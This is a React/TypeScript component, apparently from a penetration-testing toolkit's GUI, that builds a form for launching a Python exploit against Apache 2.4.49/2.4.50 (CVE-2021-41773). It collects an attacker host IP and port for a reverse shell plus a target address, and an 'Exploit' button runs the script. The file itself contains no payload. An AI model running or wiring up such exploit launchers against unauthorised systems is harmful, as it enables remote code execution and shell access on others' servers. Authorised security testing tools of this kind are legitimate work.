import { Button, LoadingOverlay, NativeSelect, NumberInput, Stack, TextInput, Title } from "@mantine/core";
import { useForm } from "@mantine/form";
import { useCallback, useState } from "react";
import { CommandHelper } from "../../utils/CommandHelper";
import ConsoleWrapper from "../ConsoleWrapper/ConsoleWrapper";

interface FormValues {
    hostIP: string;
    targetIP: string;
    hostPort: number;
    targetPort: number;
    version: string;
}

export function CVE202141773() {
    const [loading, setLoading] = useState(false);
    const [output, setOutput] = useState("");
    const [selectedVersion, setSelectedVersion] = useState("2.4.49");

    let form = useForm({
        initialValues: {
            hostIP: "",
            targetIP: "",
            hostPort: 4444,
            targetPort: 80,
            version: "",
        },
    });

    const onSubmit = async (values: FormValues) => {
        setLoading(true);

        const args = [
            "/usr/share/ddt/cve-2021-41773.py",
            "-i",
            values.hostIP,
            "-p",
            `${values.hostPort}`,
            "-v",
            values.targetIP,
            "-q",
            `${values.targetPort}`,
            "-w",
            values.version,
        ];
        const output = await CommandHelper.runCommand("python3", args);

        setOutput(output);
        setLoading(false);
    };

    const clearOutput = useCallback(() => {
        setOutput("");
    }, [setOutput]);

    return (
        <form onSubmit={form.onSubmit((values) => onSubmit({ ...values, version: selectedVersion }))}>
            <LoadingOverlay visible={loading} />
            <Stack>
                <Title>Apache 2.4.49/2.4.50 RCE (CVE-2021-41773)</Title>
                <TextInput
                    label={"Host IP (your machine, for the reverse shell)"}
                    required
                    {...form.getInputProps("hostIP")}
                />
                <NumberInput label={"Host port (for reverse shell)"} {...form.getInputProps("hostPort")} />
                <TextInput label={"Target IP or Hostname"} required {...form.getInputProps("targetIP")} />
                <NumberInput label={"Target port"} required {...form.getInputProps("targetPort")} />
                <NativeSelect
                    value={selectedVersion}
                    onChange={(e) => setSelectedVersion(e.target.value)}
                    title={"Scan option"}
                    data={["2.4.49", "2.4.50"]}
                    required
                    label={"Pick an apache version"}
                />
                <Button type={"submit"}>Exploit</Button>
                <ConsoleWrapper output={output} clearOutputCallback={clearOutput} />
            </Stack>
        </form>
    );
}
